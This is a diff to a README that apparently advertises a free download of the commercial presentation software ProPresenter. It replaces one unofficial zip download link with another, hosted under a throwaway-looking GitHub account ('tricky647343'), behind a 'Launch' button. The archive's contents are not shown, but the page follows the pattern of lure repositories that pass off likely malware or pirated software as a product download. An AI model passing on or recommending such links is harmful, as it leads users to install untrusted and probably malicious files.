@@ -24,7 +24,7 @@ Get all the details on ProPresenter vs Proclaim, the cost of ProPresenter, add v
 - What is ProPresenter
 
 ## Download Software
-👉 [Launch Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) 👈
+👉 [Launch https://github.com/tricky647343/ProPresenter-Download/releases/download/v1.0/Application.zip](https://github.com/tricky647343/ProPresenter-Download/releases/download/v1.0/Application.zip) 👈
 
 Feel free to explore the content, download the software, and enhance your ProPresenter experience. Whether you are new to ProPresenter or looking for advanced tips and tricks, this repository has got you covered.
 
